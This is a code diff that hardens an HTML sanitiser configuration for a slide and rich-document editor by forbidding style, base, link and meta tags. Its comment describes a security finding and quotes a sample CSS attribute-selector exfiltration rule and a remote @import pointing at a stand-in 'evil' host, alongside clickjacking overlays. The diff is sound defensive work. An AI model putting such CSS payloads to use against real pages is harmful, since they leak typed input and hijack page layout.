@@ -30,9 +30,28 @@ const FORBID_EVENT_ATTR = [
 
 // Rich HTML (slides, rich documents): allow the standard HTML profile but
 // forbid anything that can execute code or capture input.
+//
+// THIRD-PASS (sec/office-triple): `<style>` was NOT forbidden and DOMPurify's
+// html profile keeps it. Its CSS is only weakly filtered — a `<style>` block
+// carrying a full-viewport `position:fixed;inset:0` overlay (clickjacking / UI
+// redress), an attribute-selector data-exfil rule
+// (`input[value^="a"]{background:url(https://evil/…)}`), or `@import
+// "https://evil/…"` ALL survived sanitisation verbatim. That matters because the
+// slide surfaces render this sanitiser's output through `dangerouslySetInnerHTML`
+// (SlideCanvas / SlidePreview / SlidesEditor / PresenterView) — so a hostile CRDT
+// slide-object `html`, or imported HTML, could inject page-wide CSS straight into
+// the live app DOM. Our style policy is inline-attribute allow-listing only
+// (sanitizeStyleValue); a `<style>` ELEMENT bypasses it entirely and TipTap/Reveal
+// never legitimately emit one, so we forbid the tag outright (content removed, not
+// dumped). `base`/`link`/`meta` are forbidden for the same document-hijack reasons
+// (`<base href>` retargets every relative URL; `<link rel=stylesheet>` pulls remote
+// CSS) — none are ever needed in editor/slide content.
 export const RICH_HTML_CONFIG = {
   USE_PROFILES: { html: true },
-  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button'],
+  FORBID_TAGS: [
+    'script', 'iframe', 'object', 'embed', 'form', 'input', 'button',
+    'style', 'base', 'link', 'meta',
+  ],
   FORBID_ATTR: FORBID_EVENT_ATTR,
 }
 
